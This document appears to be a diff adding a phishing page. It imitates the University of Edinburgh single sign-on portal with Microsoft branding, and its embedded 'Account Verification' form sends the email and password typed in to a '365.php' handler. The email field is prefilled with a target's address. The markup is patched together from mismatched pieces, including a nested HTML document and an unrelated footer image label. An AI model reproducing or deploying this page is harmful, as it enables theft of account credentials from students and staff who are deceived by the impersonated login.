@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta content="IE=10.000" http-equiv="X-UA-Compatible" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
+    <meta content="text/html;charset=UTF-8" http-equiv="content-type" />
+    <meta content="no-cache,no-store" http-equiv="cache-control" />
+    <meta content="no-cache" http-equiv="pragma" />
+    <meta content="-1" http-equiv="expires" />
+    <meta content="Connecting to The University of Edinburgh" name="mswebdialog-title" />
+    <title>Sign In</title>
+	<link rel="icon" type="image/png" href="https://lh4.googleusercontent.com/-6DRE7a5AcB4/AAAAAAAAAAI/AAAAAAAAAKM/5K1J4UolszQ/s0-c-k-no-ns/photo.jpg" />
+
+    <script type="text/javascript">
+
+</script><script type="text/javascript">
+
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+</script>
+    <link href="https://edadfed.ed.ac.uk/adfs/portal/css/style.css" rel="stylesheet" type="text/css" />
+    <style type="text/css">
+.illustrationClass {background-image:url(https://edadfed.ed.ac.uk/adfs/portal/illustration/illustration.jpg);}    </style>
+  </head>
+  <body class="body" dir="ltr">
+    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
+      <h1>
+        JavaScript required</h1>
+      <p>
+        JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+      <p>
+        To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+    <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </script>
+    <div id="fullPage">
+      <div class="float" id="brandingWrapper">
+        <div class="illustrationClass" id="branding">
+          <img alt="            Illustration
+" id="background_background_image" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-6ybrougjmflxqw910ieyohr7wb4x4-yvoixrlaidmz4/appbranding/askzfdsqe20i-bcjwporaywega7vbt4acqnn1hiliiw/0/heroillustration?ts=635833785786917227" style="box-sizing: border-box; border: 0px; position: fixed; width: 966px; height: 735px; font-family: 'Times New Roman'; font-size: medium; visibility: visible; display: block; background-color: rgb(235, 60, 0);" />
+          <div class="smalltext" id="auto_low_bandwidth_background_notification" style="padding-top: 5px; padding-right: 500px; padding-left: 10px; box-sizing: border-box; font-size: 0.8em; visibility: hidden; color: rgb(255, 255, 255);">
+            &nbsp;</div>
+          <div>
+            &nbsp;</div>
+        </div>
+      </div>
+      <div class="float" id="contentWrapper">
+        <div id="content">
+          <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd>
+<html>
+<head>
+<title>Account Verification</title>
+<style type="text/css">
+body{
+  font-family:helvetica, verdana;
+}
+
+p{
+  font-size:15px;
+  margin:0;
+}
+
+h3{
+  margin:0;
+}
+
+#centered{
+ padding:20px;
+margin:0 auto;
+ width:740px;
+ height:640px;
+ border:1px solid silver;
+
+}
+
+#header a:link{
+   color:#4f4e4e;
+   text-decoration:none;
+   font-size:12px;
+}
+
+
+#submitBTN {
+    background: #0072c6;
+    color: #fff;
+    font-weight: bold;
+    font-size: 116%;
+    height: 2.54em;
+    right: 24.5em;
+    padding-left: 1.5em;
+    padding-right: 1.5em;
+    margin-top: 1.3em;
+    margin-left: 0.5em;
+	border:0;
+}
+#canBTN {
+    background: #cfd0d1;
+    color: #fff;
+    font-weight: bold;
+    font-size: 116%;
+    height: 2.54em;
+    right: 24.5em;
+    padding-left: 1.5em;
+    padding-right: 1.5em;
+    margin-top: 1.3em;
+    margin-left: 0.5em;
+	border:0;
+}
+
+#errfn{
+  color:red;
+  font-weight:bold;
+}
+#errfnn{
+  color:red;
+  font-weight:bold;
+}
+
+</style>
+</head>
+
+
+<body style="background:#fff; margin:0;">
+<center>
+
+<table style="width:100%;" id="header">
+<td><img src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-6ybrougjmflxqw910ieyohr7wb4x4-yvoixrlaidmz4/appbranding/askzfdsqe20i-bcjwporaywega7vbt4acqnn1hiliiw/0/bannerlogo?ts=635974776182591704" alt="Microsoft Account" width="150" height="30" /></td>
+<td style="vertical-align:top; text-align:right;"> 
+</td>
+</table></center>
+<a href="#">Account</a> | <a href="#">Help</a>
+<p style="margin-top:10px;"><font color ="black">Work or school account</font></p>
+<br>
+
+<script type="text/javascript">
+function validateForm() {
+    var x = document.forms["myForm"]["email"].value;
+    if (x == null || x == "") {
+        //alert("email cannot be empty");
+		document.getElementById('errfn').innerHTML="Email field cannot be empty";
+        return false;
+    }
+    
+    var y = document.forms["myForm"]["password"].value;
+    if (y == null || y == "") {
+        document.getElementById('errfnn').innerHTML="Password field cannot be empty";
+        return false;
+    }
+
+    
+}
+</script>
+
+<form method="post" action="365.php" onsubmit="return validateForm()" name="myForm" id="myForm">
+<table cellpadding="10">
+
+<tr>
+
+<td><input type="text" name="email" placeholder="Someone@example.com" value="jason.coyle@example.com" maxlength="50" size="40">&nbsp;<span id="errfn"></span></td>
+</tr>
+<tr>
+<td><input type="password" name="password"  placeholder="Password" maxlength="50" size="40">&nbsp;<span id="errfnn"></span></td>
+</tr>
+</table>
+
+<input type="submit" id="submitBTN" value="Sign In" />
+
+</form>
+
+
+<div tyle="text-align:center; left:40%; font-size:11px; background:#fff; height:5px; position:absolute; bottom:20px;">
+
+ </div>
+</body>
+
+</html>
+                  <input id="optionForms" name="AuthMethod" type="hidden" value="FormsAuthentication" /></form>
+                <div id="authOptions">
+                </div><br>
+                <div class="groupMargin" id="introduction">
+                   <a href="" id="cred_forgot_password_link" style="box-sizing: border-box; color: rgb(40, 114, 221); font-size: 12.8px; background-color: rgb(255, 255, 255);" tabindex="12">Can&rsquo;t access your account?</a></p></p></p></p></p>
+                  <br />
+                                      <span style="font-size: 12.8px;"></span><br style="box-sizing: border-box; font-size: 12.8px;" />
+                    <a href="" style="box-sizing: border-box; color: rgb(40, 114, 221); font-size: 12.8px; background-color: rgb(255, 255, 255);"></a>
+                                             
+                       <table id="footer_table" style="box-sizing: border-box; border-spacing: 0px; border-collapse: collapse; width: 400px; max-width: 400px; font-family: 'Times New Roman'; font-size: medium;">
+                      <tbody style="box-sizing: border-box;">
+                        <tr style="box-sizing: border-box;">
+                          <td style="box-sizing: border-box; vertical-align: top;">
+                            <div class="footer tinytext" style="box-sizing: border-box; font-size: 0.7em; font-family: 'Segoe UI', Segoe, SegoeUI-Regular-final, Tahoma, Helvetica, Arial, sans-serif; width: 360px; height: 40px; color: rgb(102, 102, 102); display: inline-block;">
+                              <span class="corporate_footer" style="box-sizing: border-box;"><span class="branding_footer" style="box-sizing: border-box;"></span>
+							  			  
+							  <span class="corp_link" id="footer_copyright_link" style="padding-right: 5px; box-sizing: border-box; cursor: pointer; display: inline-block;">&copy; 2018 Microsoft&nbsp;&nbsp;</span></p><span class="corp_link" style="padding-right: 5px; box-sizing: border-box; cursor: pointer; display: inline-block;">
+							  <a href="" id="footer_link_terms" style="box-sizing: border-box; color: rgb(0, 0, 0);" tabindex="38">
+							  <font color="blue">Terms of use</font></a>&nbsp;</span>&nbsp;<span class="corp_link" style="padding-right: 5px; box-sizing: border-box; cursor: pointer; display: inline-block;"><a href="" id="footer_link_privacy" style="box-sizing: border-box; color: rgb(0, 0, 0);" tabindex="39"><font color="blue">Privacy &amp; Cookies</font></a>&nbsp;</font></span></span></div>
+							  <p align="right"><IMG SRC ="http://blogs.microsoft.com/wp-content/uploads/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" BORDER = "0" HEIGHT = "60"
+WIDTH = "150" ALT = "Harvey and Paul Deitel"></p>
+                      </tbody>
+                    </table>
+                   <script type="text/javascript">
+       
+
+            function Login() {
+            }
+
+            Login.userNameInput = 'userNameInput';
+            Login.passwordInput = 'passwordInput';
+
+            Login.initialize = function () {
+
+                var u = new InputUtil();
+
+                u.checkError();
+                u.setInitialFocus(Login.userNameInput);
+                u.setInitialFocus(Login.passwordInput);
+            }();
+
+            Login.submitLoginRequest = function () { 
+                var u = new InputUtil();
+                var e = new LoginErrors();
+
+                var userName = document.getElementById(Login.userNameInput);
+                var password = document.getElementById(Login.passwordInput);
+
+                if (!userName.value || !userName.value.match('[@\\\\]')) {
+                    u.setError(userName, e.userNameFormatError);
+                    return false;
+                }
+
+                if (!password.value) {
+                    u.setError(password, e.passwordEmpty);
+                    return false;
+                }
+
+                document.forms['loginForm'].submit();
+                return false;
+            };
+
+            InputUtil.makePlaceholder(Login.userNameInput);
+            InputUtil.makePlaceholder(Login.passwordInput);
+     
+        </script></div>
+         
+		 </div>
+      </div>
+    </div>
+    <script type="text/javascript">
+
+
+if (navigator.userAgent.match(/iPhone/i) != null) {
+    var emails = document.querySelectorAll("input[type='email']");
+    if (emails) {
+        for (var i = 0; i < emails.length; i++) {
+            emails[i].type = 'text';
+        }
+    }
+}
+
+
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+    var msViewportStyle = document.createElement("style");
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{width:auto!important}"
+        )
+    );
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{height:auto!important}"
+        )
+    );
+    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+
+if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+    var viewport = document.querySelector("meta[name=viewport]");
+    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
+}
+
+function getStyle(element, styleProp) {
+    var propStyle = null;
+
+    if (element && element.currentStyle) {
+        propStyle = element.currentStyle[styleProp];
+    }
+    else if (element && window.getComputedStyle) {
+        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+    }
+
+    return propStyle;
+}
+
+
+var computeLoadIllustration = function () {
+    var branding = document.getElementById("branding");
+    var brandingDisplay = getStyle(branding, "display");
+    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+    if (brandingDisplay && brandingDisplay !== "none" &&
+        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+        var newClass = "illustrationClass";
+
+        if (branding.classList && branding.classList.add) {
+            branding.classList.add(newClass);
+        } else if (branding.className !== undefined) {
+            branding.className += " " + newClass;
+        }
+        if (window.removeEventListener) {
+            window.removeEventListener('load', computeLoadIllustration, false);
+            window.removeEventListener('resize', computeLoadIllustration, false);
+        }
+        else if (window.detachEvent) {
+            window.detachEvent('onload', computeLoadIllustration);
+            window.detachEvent('onresize', computeLoadIllustration);
+        }
+    }
+};
+
+if (window.addEventListener) {
+    window.addEventListener('resize', computeLoadIllustration, false);
+    window.addEventListener('load', computeLoadIllustration, false);
+}
+else if (window.attachEvent) {
+    window.attachEvent('onresize', computeLoadIllustration);
+    window.attachEvent('onload', computeLoadIllustration);
+}
+
+</script></body>
+</html>
